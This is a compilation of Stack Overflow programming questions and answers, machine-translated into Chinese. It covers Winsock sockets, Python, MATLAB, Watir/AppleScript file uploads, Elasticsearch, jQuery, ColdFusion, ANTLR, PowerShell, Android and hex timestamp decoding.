http://social.msdn.microsoft.com/Forums/zh/vcgeneral/thread/763a00ab-0e7f-44c6-9794-840fc6cb2e07
http://www.delta-search.com/?q=add+ws2_32.lib+visual+studio+2010&babsrc=HP_ss&s=web&rlz=0&as=3&ac=0%2C331
http://stackoverflow.com/questions/5220309/why-am-i-getting-linker-errors-for-ws2-32-dll-in-my-c-program
http://msdn.microsoft.com/en-US/windows/desktop/aa904949
http://msdn.microsoft.com/en-us/library/windows/desktop/ms737550(v=vs.85).aspx

#pragma once
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#include <Ws2tcpip.h>
#include <stdio.h>

void Abort(char *msg);

void main(int argc,char*argv[]){

    int ret, fd;
    struct sockaddr_in sa_dst;
    struct sockaddr_in sa_loc;

    if(argc < 3)
        Abort("Syntax: SourceIpAddress(to bind) DestinationIpAddress(to connect)");

    fd = socket(AF_INET, SOCK_STREAM, 0);

    // Local
    memset(&sa_loc, 0, sizeof(struct sockaddr_in));
    sa_loc.sin_family = AF_INET;
    sa_loc.sin_port = htons(0);
    sa_loc.sin_addr.s_addr = inet_addr(argv[1]);

    if((ret = bind(fd, (struct sockaddr *)&sa_loc, sizeof(struct sockaddr))) < 0)
        Abort("Binding to local address");

    // Remote
    memset(&sa_dst, 0, sizeof(struct sockaddr_in));
    sa_dst.sin_family = AF_INET;
    sa_dst.sin_port = htons(80);
    sa_dst.sin_addr.s_addr = inet_addr(argv[2]); // google :)

    if((ret = connect(fd, (struct sockaddr *)&sa_dst, sizeof(struct sockaddr))) < 0)
        Abort("Connect to remote address");

    printf("\n\nConnection Successfully made!!\n\n");    }

void Abort(char *msg){
fprintf(stderr,"\n\n<ERROR>: <%s>\n",msg);
perror("\n\nExiting...");
exit(EXIT_FAILURE);       } 
```

问题是绑定返回-1。我已经测试过了。

谁可以帮我这个事？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-02T02:19:42.837

当 Winsock 函数失败时，您可以调用`WSAGetLastError()`以找出原因。

在这种情况下，您没有调用`WSAStartup()`，因此`socket()`失败并`WSANOTINITIALISED`出现您忽略的错误，因此您最终将无效套接字传递给`bind()`.

# python - 在控制台打印字符串时出错

> ID：15163809
> 
> 赞同：-6
> 
> 时间：2013-03-01T17:47:22.380
> 
> 标签：python

```
for i in table.keys():
if table[i]==18798965:
    first=i
if table[i]==12738624:
    second=i
>>> print ("the encyrpted word is: %s%s") %(first,second);

the encyrpted word is: %s%s
Traceback (most recent call last):
File "<pyshell#31>", line 1, in <module>
print ("the encyrpted word is: %s%s") %(first,second);
TypeError: unsupported operand type(s) for %: 'NoneType' and 'tuple' 
```

我认为大学里的python版本和我在家里用的不一样。

有人可以帮我解决这个错误吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T17:49:14.760

`%`您使用它的方式对字符串进行操作；您正在尝试对返回的值进行操作`print()`，即`None`.

将格式移动到`()`:

```
print ("the encyrpted word is: %s%s" %(first,second)) 
```

注意：Python 不会`;`在代码行的末尾使用。

# python - convert_obj_three.py 的语法错误

> ID：15163812
> 
> 赞同：1
> 
> 时间：2013-03-01T17:47:32.930
> 
> 标签：python, 3d, three.js, webgl

每当我尝试转换我的 obj 文件时，我都会在第 781 行收到语法错误。

```
C:\Users\Paul>cd "C:\Users\Paul\Documents\GitHub\three.js\utils\converters\obj"

C:\Users\Paul\Documents\GitHub\three.js\utils\converters\obj>python convert_obj_
three.py -i dragon.obj -o dragon.js -x 1000
File "convert_obj_three.py", line 781
print "WARNING: skipping morph [%s] with different number of vertices [%d] t
han the original model [%d]" % (name, n_morph_vertices, n_vertices)

                           ^
SyntaxError: invalid syntax 
```

我不确定发生了什么。我对照其他成功的人检查了我在做什么，我似乎没有做错任何事。有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T19:47:39.110

由于您在评论中提到您使用的是 Python 3.3，因此您可以通过将 print 语句更改为使用 3.x 的字符串`format`运算符（并`print()`作为函数）来解决此问题：

```
print(
    "WARNING: skipping morph {} with different number of vertices {} "
    "than the original model {}".format(name, n_morph_vertices, n_vertices)
) 
```

或者您可以使用 python 2.x 解释器运行相同的脚本，而无需进行任何更改。

# c# - .NET 3.5 中的 EverNote C# SDK

> ID：15163813
> 
> 赞同：0
> 
> 时间：2013-03-01T17:47:33.270
> 
> 标签：c#, .net, dll, sdk, evernote

EverNote SDK 似乎使用 .NET 4，而我当前的项目使用的是 .NET 3.5。我不认为我可以简单地将 3.5 更新到 4，因为它可能会导致问题，因为我有一个很大的代码库。

我正在尝试使用随 EverNote SDK 提供的命名空间，以便我可以通过我的应用程序连接到 EverNote。反正有没有做我想做的事而不必更新到 4.0？每次我尝试添加 .DLL 时，它都会说框架不兼容。

EverNote 的 C# SDK：[https ://github.com/evernote/evernote-sdk-csharp](https://github.com/evernote/evernote-sdk-csharp)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:49:19.107

根据设计，没有（直接）方法可以使用 3.5 项目中的 4.0 程序集。

你真的需要将你的代码库（至少是主要的可执行文件，以及任何需要引用 Evernote 的库）移动到 4.0。

唯一的选择是尝试将他们的代码库向后移植到 3.5。但是，这可能会很困难，尤其是在他们使用 4.0 功能的情况下。

# matlab - MATLAB - 在没有 for 循环的情况下对矩阵索引执行操作

> ID：15163814
> 
> 赞同：0
> 
> 时间：2013-03-01T17:47:36.467
> 
> 标签：matlab, for-loop, matrix, indices

自从我在MATLAB中完成矩阵运算以来已经有一段时间了，所以如果这很容易解决，请原谅我。

我有一些 NxM 矩阵`A`，我想对`A`. 我知道如何使用`for`循环来做到这一点，但由于我使用的是 MATLAB，我想利用 MATLAB 快速对矩阵进行运算的能力。

假设我有一个名为`myFunc`. 有没有办法在没有`for`循环的情况下执行以下操作（例如使用矩阵乘法）：

```
for i=1:M
    A(:, floor(i*myFunc())) = A(:, i) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:54:41.743

这个可以吗？

```
A(:,floor([1:M]*myFunc())) = A(:,1:M) 
```

因为我不知道你的 myFunc 是否也依赖于 i。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:56:25.833

您可能只需替换`i*`为`(1:M).*`，如下所示：

```
A(:, floor((1:M).*myFunc())) = A(:,1:M) 
```

请注意，`.*`它会进行元素乘法而不是矩阵乘法。

# ruby - 在 OSX 上的 Chrome 中使用 WATIR 自动上传文件

> ID：15163816
> 
> 赞同：1
> 
> 时间：2013-03-01T17:47:37.000
> 
> 标签：ruby, macos, google-chrome, watir, watir-webdriver

我正在尝试使用 WATIR 自动上传文件。我不控制网站代码，并且 javascript 被混淆了，它一直令人沮丧。

我试图设置 file_field ，但该网站使用 javascript 来发布帖子，我无法触发提交。我最好的方法是模仿用户。

有一个拖放界面，单击它会打开一个标准的 OSX 文件选择器对话框。我无法弄清楚如何从 WATIR 控制这个文件选择器对话框。看起来在 IE 上有一个名为 window_helper 的库，它允许您执行此操作。

[如何使用 watir 和 IE 上传文件？](https://stackoverflow.com/questions/2687293/how-to-upload-a-file-with-watir-and-ie)

我无法在 Chrome 中弄清楚。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T23:13:19.683

我发现在 OSX 上与文件上传字段交互的最可靠方法是使用：

```
$browser.file_field(:id, //).set("filepath\/...\/file.png") 
```

不幸的是，它只会选择文件，不会关闭对话框。

然而，正如 Željko 所说，如果没有任何关于页面外观/代码在做什么的参考点，很难提供帮助。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-13T19:16:48.407

如果您唯一的选择是自动化操作系统的文件选择控制，那么您可能不得不在脚本中使用不同的工具。

要考虑的一种选择是视觉效果的[Sikuli 。](http://www.sikuli.org/)我没有尝试在 Mac 上使用它，所以我不知道它是否适合该平台，但它在 PC 上运行良好。

另一种可能是 gem [AXElements](http://rubygems.org/gems/AXElements)，我没有使用过，但看起来很有希望

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-12-18T18:47:48.833

我知道这是一个较老的问题，但我最近不得不为我们工作中的自动化套件处理 OSX 上的 FileUpload 表，所以我想我会把它作为人们的资源发布。实际上，我们确实将 Sikuli 用于前面提到的某些事情，但尽量将其用作最后的手段，因为它需要视觉识别。（虽然同意它工作得很好）

相反，我使用了几个 Applescript 处理程序。我们的需求与海报的不同，所以通常这些不包含在如下相同的脚本中。为了方便任何想要获取代码的人，我只是将它们放在脚本中。只需使用您想要调用文件上传表的任何工具，然后从终端运行以下代码：

osascript /Path/To/The/Saved/Script.scpt /Path/To/MyUploadFile.txt 火狐打开

如您所见，它需要 3 个参数。要上传的文件的路径、浏览器的名称以及要在“文件上传”表中单击的按钮。当然，如果需要，您可以对这些值进行硬编码。实际上，我们偶尔需要单击“取消”，这就是为什么会这样。

```
on run argv
if count of argv is not equal to 3 then
    log "You must pass 3 arguments to this script. The path to the file to upload, the browser name and finally the button to click."
    quit
end if

set theFileToUploadPath to item 1 of argv
set theBrowserName to item 2 of argv
set theButtonToClick to item 3 of argv 

goToFolder(theFileToUploadPath)
delay 1
clickFileUploadButton(theBrowserName, theButtonToClick)
end run

on goToFolder(folderPath)
tell application "System Events"
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke folderPath
    delay 1
    key code 76
end tell
end goToFolder

on clickFileUploadButton(browserName, buttonToClick)
tell application "System Events"

    try
        tell process browserName
            activate
            if buttonToClick is equal to "Cancel" then
                click button "Cancel" of window "File Upload"
            else if buttonToClick is equal to "Open" then
                click button "Open" of window "File Upload"
            else
                log "Incorrect button passed to handler"
            end if
        end tell
    on error
        log "Unable to close File Upload window for browser: " & browserName
    end try

end tell
end clickFileUploadButton 
```

希望这在某些时候对某人有所帮助。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-08T06:10:21.707

可能在填充该字段后，可能有一些客户端代码正在等待诸如 onChange 之类的事件触发。您可能必须在更改设置文件名后尝试在控件上触发事件

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-04T13:22:15.460

您可以使用 RAutomation 来执行此操作，这可以访问默认文件选择器对话框

例子：

```
window = RAutomation::Window.new :title => windowTitle
window.text_field(:class =>"Edit").set(file_name)
window.button(:value => "&Open").click 
```

# elasticsearch - 如何在elasticsearch中找到部分匹配

> ID：15163819
> 
> 赞同：0
> 
> 时间：2013-03-01T17:47:49.607
> 
> 标签：elasticsearch

我正在寻找所有在数据库中拥有某种电子邮件的用户：

```
'user' :
            {         
             'properties': 
                {
                    'user_name': { 'type': 'string', 'index' : 'not_analyzed' }, 
                    'about': { 'type': 'object' },
                }
            } 
```

about 字段是一个 JSON 对象，可能如下所示：

```
{"nickname":"bobby McBob", "contact":"bobmcbob@gmail.com", "hobbies":"tennis"} 
```

但没有预定的结构。

我想以符合*@* .com 模式的方式找到所有拥有字符串的用户，希望这将返回所有拥有电子邮件的用户。

我该怎么做呢？

甚至是一个简单的查询，旨在查找 gmail，例如

```
curl -X GET 'http://localhost:9200/index_name/user/_search' -d '{"query":{"match":{"_all":"gmail.com"}}}' 
```

不起作用。也许我应该在索引时用不同的分析器分析对象“关于”？分离/标记它？

我应该使用不同的查询吗？

我该怎么做呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-05-19T08:20:08.553

您可以使用`pattern tokenizer`来捕获模式`abc.com`并将其用于分析器中的字段`about`( `analyzer_emaildomain`)。例如：

```
"analysis":{
        "analyzer":{
          "analyzer_emaildomain": {
                    "tokenizer": "emaildomain_tokenizer"
           }
        },
         "tokenizer" : {
            "emaildomain_tokenizer" : {
                "type": "pattern",
                "pattern" : "\\b[a-zA-Z0-9._%+-]+@([a-zA-Z0-9.-]+\\.com)\\b",
                "group":1
            }
        }
} 
```

您可以在设置中看到，我捕获了第 1 组，它是在 之后`@`和结尾的任何字母字符，`.com`并将针对您的情况进行捕获`gmail.com`。有关模式标记器的更多信息，[请访问 http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/analysis-pattern-tokenizer.html](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/analysis-pattern-tokenizer.html)

# php - 使用 jquery 检索属性值

> ID：15163824
> 
> 赞同：0
> 
> 时间：2013-03-01T17:47:59.983
> 
> 标签：php, jquery, attributes

我需要`<div>`使用 jquery 检索标签的属性值

这是我的 html 代码，`$_GET['availabel_table']`来自`$_GET['number-of-person']`url

```
<div id=main_menu_data class="grid_21 alpha  prefix_1" availabel-table="<?php echo $_GET['availabel_table'] ?>" number-of-person="<?php echo $_GET['number_of_person'] ?>" > 
```

jQuery代码

```
var availabel_table = $("#main_menu_data").attr("availabel-table");
var number_of_person = $("#main_menu_data").attr("number-of-person"); 
```

但是这些变量中没有价值。我做错了什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:52:42.847

这个：

```
<div id=main_menu_data 
```

应该是这样的：

```
<div id="main_menu_data" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:51:55.893

DIV 的 id 上缺少引号？

```
<div id="main_menu_data" class="grid_21 alpha  prefix_1" availabel-table="<?php echo  $_GET['availabel_table'] ?>" number-of-person="<?php echo $_GET['number_of_person'] ?>" > 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:53:41.630

您应该使用有效的数据属性设置数据值，您的代码将类似于：

```
 <div id="main_menu_data" class="grid_21 alpha  prefix_1" data-available-table="<?php echo     $_GET['availabel_table'] ?>" data-number-of-people="<?php echo $_GET['number_of_person'] ?>" > 
```

然后要访问这些数据，您可以使用 jQuery 数据函数：

```
 var available_table = $("#main_menu_data").data("available-table");
  var number_of_people = $("#main_menu_data").data("number-of-people"); 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-03-01T17:54:39.463

```
var numberPerson= $('#number_of_person').val();
  var availabelTable= $('#availabel_table').val(); 
```

当然，您应该在 html 中声明那些变量

# javafx-2 - javafx 甘特图

> ID：15163827
> 
> 赞同：0
> 
> 时间：2013-03-01T17:48:32.350
> 
> 标签：javafx-2, javafx, gantt-chart

我想在 javafx 中做甘特图，但没有示例如何做到这一点。我尝试将条形图转换为甘特图，但这并没有带来好的结果。:/ 有什么简单的方法吗？

附言。对不起我的英语；p

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-02T10:26:03.983

好的，由于您不对我的评论发表评论，因此我将留下官方答案的版本。

现在，甘特图不是 JavaFX 2+ 的一部分，而且我不知道已经在其中构建的现有示例。所以，答案是 - 自己构建它。

JavaFX 的某些部分是开源的，javafx 控件和 javafx-charts 项目也是开源的。他们可以在这里找到：http: [//openjdk.java.net/projects/openjfx/](http://openjdk.java.net/projects/openjfx/)

您可以观察条形图、折线图的代码（对于大型图表，可能还有滚动窗格），并且应该清楚地了解如何自己构建甘特图。这将需要一些编码，是的..

可能，如果它创建得好，您甚至可以完成该过程并将其贡献给 open jfx。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-23T18:23:42.333

也许你可以试试我的名为 FlexGanttFX 的商业框架，用于 JavaFX 甘特图。 [http://www.flexganttfx.com](http://www.flexganttfx.com)

# python - 如何制作迭代大字符串的类似字符串的变量？

> ID：15163829
> 
> 赞同：2
> 
> 时间：2013-03-01T17:48:34.487
> 
> 标签：python, string, iterator

在 Python 中，我可以构建一个类似于字符串但在内部迭代字符串序列的变量吗？

例如

```
def function_a():
    for i in xrange(100000000):
        yield str(i) 
```

这将遍历一个字符串列表并且它会有效地完成它 - 一次只在内存中保留一个字符串。但我想要的是这样的：

```
''.join([s for s in function_a()]) 
```

但我敢打赌，这只是做天真的事情，遍历整个集合并将它们全部连接到内存中的一个大字符串中。另一个问题是我想要一个变量，我不想让用户接触到实际进行连接的丑陋工作。所以也许用户会做类似的事情：

```
magic_str = get_long_but_memory_efficient_str() 
```

然后使用它有效地打印到屏幕上（并随时释放内存）：

```
print magic_str 
```

或者我对它的*真正*用途是将 HTTP 流式传输到服务器：

```
request = urllib2.Request(url, magic_str) 
```

显然存在*这样*的事情。查看下面的代码以有效地将文件流式传输到服务器（[来自这个问题](https://stackoverflow.com/a/2504133/348056)）。

```
f = open('somelargefile.zip','rb')
mmapped_file_as_string = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
request = urllib2.Request(url, mmapped_file_as_string)
request.add_header("Content-Type", "application/zip")
response = urllib2.urlopen(request) 
```

但是我的情况不同，因为我正在构建要流式传输到服务器的字符串。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T18:24:55.253

**根据您的实际需要更新答案**：

```
>>> class MagicString(str):
    def __init__(self, gen):
        self.gen = gen
    def __str__(self):
        try:
            return self.gen.next()
        except StopIteration:
            return '' #boolean value = False

>>> def run_efficiently(some_function, magic_str):
    substr = str(magic_str)
    while substr:
        some_function(substr)
        substr = str(magic_str) 
```

**说明**：您需要以下组合：

1.  使用生成器产生子字符串的对象（例如在字符串表示上）
2.  一个函数调用另一个函数，直到对象的表示返回一个空字符串。

**将此示例扩展到 print**：

```
>>> import sys
>>> def print_without_breaks(some_string):
    sys.stdout.write(some_string)

>>> s = MagicString(c for c in '12345')
>>> run_efficiently(print_without_breaks, s)
12345 
```

您可以根据实际需要使用类似的方法，您可以对每个请求的返回值做一些有用的事情。

*所以也许，你根本不需要变量/对象......只是一些重复运行的简单代码，直到你的生成器吐出一个`StopIteration`异常。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T18:12:54.723

不确定我完全理解你想要什么，但在我看来，你担心 python 字符串的不变性。

join 不会像您想象的那样创建很多临时对象。如果您已经有一个列表， ''.join 将非常有效，并且只会创建一个字符串。

如果您没有理由使用要连接的对象创建列表，只需使用 cStringIO 模块。这将使用最少的内存。

如果您仍然担心，或者您是顽固的 C 程序员，不理解人们如何看不到空终止的字节序列是上帝希望我们处理字符串的方式，那么用 C 编写您的那部分代码，这是例如，与 Java 相比，这在 python 中非常有用。

# sql-server - ## 在 Coldfusion 变量前面

> ID：15163831
> 
> 赞同：2
> 
> 时间：2013-03-01T17:48:38.517
> 
> 标签：sql-server, coldfusion, coldfusion-7

```
<CFQUERY Name="LoadCompletions"  datasource="#request.datasource#"> 
SELECT n.*, u.UserID into ##Completions
FROM 
    OPENROWSET(
        'Microsoft.ACE.OLEDB.12.0',
        'Excel 12.0;HDR=YES;Database=#Destination_File#',
        'SELECT * FROM [Sheet1$]') n
    inner join LE_User u on 's'+n.id = u.login_name
</cfquery> 
```

我检查了整个谷歌，看看##Completions 是什么意思。有人可以帮帮我吗？当我尝试转储它时，它给出了相同的东西##Completions。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-01T17:52:51.120

这`##`是为了转义文字`#`，因此它是传递给数据库的 SQL 的一部分。（与标记 CFML 哈希表达式相反。）

`#tablename`是[本地临时表](http://msdn.microsoft.com/en-us/library/ms177399(v=sql.105).aspx)的 Microsoft SQL Server 语法。

该`Completions`位只是一个任意的表名（因此为什么搜索它不会带来任何相关的东西）。

请注意，还有全局临时表，写为`##tablename`，需要`####tablename`在 cfquery 中转义到。

# python - 难以添加两个变量

> ID：15163841
> 
> 赞同：0
> 
> 时间：2013-03-01T17:49:08.887
> 
> 标签：python

我一直在 codeacademy 上学习 python，我想制作一个可以帮助我完成作业的程序，我从 pythagoras a ² +b ² =c ²开始，它在 codeacademy 上运行良好，但是当我在真正的 python 上尝试时程序它不起作用，它在我读懂错误之前关闭。

```
a = input ("what is a")
b = input ("what is b")

a = a*a
b = b*b
c =  a+b

from math import sqrt
c = sqrt (c)

print (c) 
```

我知道它很基础，但我还在学习我也不确定python代码学院的版本是什么，但我很确定我使用的python程序是3

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T17:51:30.893

我相信您在这里遇到了类型转换问题。因此，您需要将其转换为整数：

```
from math import sqrt
a = int(raw_input("what is a: "))
b = int(raw_input("what is b: "))

a = a*a
b = b*b
c = a+b

c = sqrt (c)
print (c) 
```

此外，在读取输出之前不必关闭程序，您需要从终端运行 pythonfile。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:54:38.170

蟒蛇2：

```
>>> a=input()
123
>>> a #is an int
123 
```

蟒蛇 3：

```
>>> a=input()
123
>>> a #is a string
'123' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:51:53.423

您遇到了类型转换问题。投射到 a `float`（或 a `int`，[这里](http://blog.stillaslife.com/code/tutorials/python-tutorial-3-integers-and-floats/)有一点关于两者之间的区别），一切都会好起来的。

```
a = float(input ("what is a"))
b = float(input ("what is b")) 
```

您还应该考虑使用 Python 解释器。这是我尝试手动单步执行代码时得到的结果：

```
>>> a = input('what is a')
what is a3
>>> a*a # I put 3 in as my number, but it gave me the str value of '3'!
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: can't multiply sequence by non-int of type 'str' 
```

我还建议`try...except`帮助您提供更好的错误消息。如果你使用`while`它，它也会成功，这样你就可以确保你有一些东西可以使用，例如：

```
# Make them keep inputting "a" until they give you something 
# you can actually work with!
while 1:
    try:
        a = float(input ("what is a"))
        break
    except TypeError:
        print('That was not a number! please try again') 
```

* * *

注意：这在 Python 2.x 中不会发生，因为输入可以返回一个 int。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T17:52:13.460

`input`返回一个字符串（类型`str`）。为了使乘法起作用，您必须`int`从它们创建一个整数（类型），如下所示：

```
a = int(input("what is a?"))
b = int(input("what is b?")) 
```

或者，如果您希望用户能够输入小数，请使用`float`：

```
a = float(input("what is a?"))
b = float(input("what is b?")) 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-03-01T17:53:08.927

如果您在 python 调试器中运行它，您将逐行查看正在发生的事情，并能够判断哪一行是问题所在。我知道你是 Python 新手，但尽快学习使用调试器会让你的学习过程变得更快。尝试：

```
python -m pdb myscript.py 
```

# antlr - 可以使用 0 次或 1 次的令牌的 ANTLR 语法表达式评估

> ID：15163846
> 
> 赞同：2
> 
> 时间：2013-03-01T17:49:35.503
> 
> 标签：antlr, grammar

我有一个组合的 ANTLR 语法，它将寻找特定的标记/标记组合。有些代币可以使用 0 次或 1 次。我想将“找到”或“未找到”值存储到这些标记的哈希图中。我已经知道，在令牌可用的情况下如何做到这一点。但是对于尚未找到的令牌，我该怎么做。
以下示例显示它非常简化：

```
grammar Expr;

@header {
import java.util.HashMap;
}

@members {
HashMap<String,String> memory = new HashMap<String,String>();
}

statements: ONE  
      (WS TWO {memory.put("two","found");})? 
      WS THREE EOF;    

ONE: 'one';
TWO: 'two';
THREE: 'three';
WS: ' '; 
```

是否有可能直接在这个语法中找出“TWO”没有找到，因此给 HashMap 赋予了不同的值？

```
memory.put("two","not found"); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T19:09:40.697

> 是否有可能直接在这个语法中找出“TWO”没有找到，因此给 HashMap 赋予了不同的值？

当然，像这样：

```
statements
 : ONE WS ( TWO WS THREE EOF {memory.put("two","found");}
          | THREE EOF        {memory.put("two","not found");}
          )
 ; 
```

## 编辑

或者，如果您有更多可选标记（`TWO`,`THREE`并且`FOUR`是可选的），请执行以下操作：

```
statements
 : ONE (WS TWO memory.put("two","found");     | memory.put("two","not found");) 
       (WS THREE memory.put("three","found"); | memory.put("three","not found");) 
       (WS FOUR memory.put("four","found");   | memory.put("four","not found");) 
   EOF
 ; 
```

或者这样的东西也应该起作用：

```
statements
 : ONE (WS TWO)? (WS THREE)? (WS FOUR)?
   {
     memory.put("two", $TWO.text == null ? "not found" : "found");
     memory.put("three", $THREE.text == null ? "not found" : "found");
     memory.put("four", $FOUR.text == null ? "not found" : "found");
   }
 ; 
```

# quickbooks - 有了新的服务器和桌面 - 无法再连接 QB RDS

> ID：15163847
> 
> 赞同：0
> 
> 时间：2013-03-01T17:49:35.597
> 
> 标签：quickbooks, intuit-partner-platform, intuit

我使用 Quickbooks RDS 将 Access 数据库连接到 Quickbooks。一切都很顺利，但我们最近升级了整个网络，现在在尝试建立从 RDS 客户端到服务器的连接时收到错误消息。错误是“公钥交换错误 - 对象已存在”。我只是想知道为什么会突然发生这种情况。我假设这是基于我所读内容的权限问题。我已经进入 MachineKeys 文件夹并尝试更改权限以允许所有但没有解决它。我还禁用了 Windows 防火墙，为其所需的端口添加了例外，并禁用了防病毒软件。我的 QB 文件存储在我的网络驱动器上，但我使用其中一台工作站作为 RDS 服务器。有没有人遇到过这个？我正在使用 QB2012 和 RDS6。

# powershell - 在传递到 foreach 循环之前从数组中删除字符

> ID：15163853
> 
> 赞同：0
> 
> 时间：2013-03-01T17:49:59.960
> 
> 标签：powershell

我有一个 powershell 脚本，它可以创建文件夹并基于数组进行共享。所以数组就像 `$folders = ("C:\test1", "C:\test2")`

我做了一个`foreach`循环，使文件夹就好了。

这就是问题所在。我想`foreach`使用相同的数组创建另一个循环，`$folders`除了去掉前三个字符（所以`C:\test1`简单地变成`test1`）。我这样做是为了创建共享（这只是没有驱动器内容的文件夹的名称）。

我将如何剥离前三个字符并将其传递给我的新循环？非常感谢！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:55:34.757

`$newFolders = $folders | % { $_.substring(3) }`将 $newFolders 设置为您要查找的数组。

您也可以使用类似`$folders | % { $_.substring(3) } | % { sharing_code }`.

也就是说，更强大的版本将类似于`$newFolders = $folders | % { split-path -leaf $_ }`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T20:59:32.550

一个简短的解决方案:)

$文件夹 - 替换 '^...'

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T18:02:54.717

我至少可以想到三种方法来做到这一点。选择你最喜欢的 ;)

```
# The most basic
$folders | %{$_.trimstart("c:\")}

# This one works with all drive letters
$folders | %{$_ -replace "\w:\\"}

# That last will only return the final file/folder in your path
# If you use a path such as "c:\something\else" then it'll return "else"
$folders | %{split-path $_ -leaf} 
```

！

# android - 是否可以在通知抽屉中创建具有透明背景的通知？

> ID：15163856
> 
> 赞同：0
> 
> 时间：2013-03-01T17:50:13.867
> 
> 标签：android, notification-bar

我想在通知抽屉透明中创建一个具有透明背景的通知。可能吗？

（Dibya 想改进我的陈述，但我发现这并不是我所需要的。

在使用NotificationCompat.Builder创建通知时，我怀疑是否可以在通知抽屉中设置背景透明。不仅仅是“使通知抽屉中的通知背景透明”，我知道修改系统ui可以解决。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T19:22:50.560

您可以使用自定义通知布局来控制通知的显示方式。

不过，我不明白你为什么要这样做。通知出现在 UI 的系统部分中，因此它们下面永远不会有任何东西。如果您使用“全屏”，则不会出现通知。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T19:26:00.307

AFAIK，不。您可以设置自定义可绘制对象以用作通知背景。当然，您可以使用完全透明的 png，但它仍将与通知抽屉本身一样透明。

通知抽屉及其透明度由 SystemUI 应用程序控制，它是一个系统应用程序，您不能在运行时从另一个 apk 修改它。或者您可以下载Android OS 源代码，修改SystemUI 的源代码，重新编译整个OS，为您的设备构建一个自定义ROM 映像并将其安装到设备上。如果您想尝试自定义 ROM 等，[这个论坛帖子](http://forum.xda-developers.com/showthread.php?t=1085118)似乎在处理相同的主题。

# encoding - 从十六进制数据中确定时间戳数据

> ID：15163858
> 
> 赞同：1
> 
> 时间：2013-03-01T17:50:37.867
> 
> 标签：encoding, timestamp, hex

我正在尝试从十六进制序列中提取时间戳数据，并且缩小了隐藏时间戳的十六进制数据

我发现两个日期相差大约两分钟

```
(2012-12-01 06:00:55 -0700)
A4  01  1B  FE  36  05  88  23  E4  40  

(2012-12-01 06:02:56 -0700)
A4  01  EF  F9  AF  10  88  23  E4  40  

(2012-12-01 06:00:49 -0700)
A4  01  67  5B  A5  04  88  23  E4  40  

(2012-12-02 06:00:47 -0700)
A4  01  D6  CF  74  04  A8  23  E4  40 
```

更多时间戳

```
A4  01  90  A1  B2  03  C8  2E  E4  40
A4  01  22  2D  E3  03  C8  2E  E4  40  
 -0800 
E0  01  FF  15  82  03  C8  2E  E4  40 
```

我很确定，根据我能够取消成为日期的其他一些数据，它使用的是小端编码

但这是我能做到的。我正在使用这个网站[http://fmdiff.com/fm/timestamp.html](http://fmdiff.com/fm/timestamp.html)将已知时间戳转换为一些常见格式，但我只是没有看到它。

是否有任何其他格式（可能在 .net 中）我可以尝试使用此信息？

* * *

解决了，谢谢@Markus

这是转换（LE）十六进制的代码

```
#include <Debug.au3>
#include <Date.au3>

_DebugSetup("Debug")

Func GetExcelTimestamp($dec)
   $excel_time = Dec($dec,3)
   $timeinms = ($excel_time-25569)*24*3600*1000
   $sTime = _DateAdd("s", Int($timeinms / 1000), "1970/01/01 00:00:00")

   _DebugOut($dec & " - " & $sTime)
   Return $sTime
EndFunc   ;==>GetExcelTimeDate

GetExcelTimestamp("40E423880536FE1B")
GetExcelTimestamp("40E4238810AFF9EF")
GetExcelTimestamp("40E4238804A55B67")
GetExcelTimestamp("40E423A80474CFD6") 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T02:18:01.133

下面是读取日期的 Java 代码（解释如下）：

```
//-------------------------------------------------------------------------------
// Convert from hex to usable date value

long temp = 0x40E423880536FE1BL; // Decode 64-bit little endian (backwards) hex
//long temp = 0x40E4238810AFF9EFL; // example 2
//long temp = 0x40E4238804A55B67L; // example 3
//long temp = 0x40E423A80474CFD6L; // example 4

double excel_time = Double.longBitsToDouble(temp); // days since 1/1/1900

//-------------------------------------------------------------------------------
// Convert to something that Java can handle and output in correct timezone

long java_time = (long) ((excel_time-25569)*24*3600*1000); // ms since 1/1/1970
Date date = new Date(java_time);

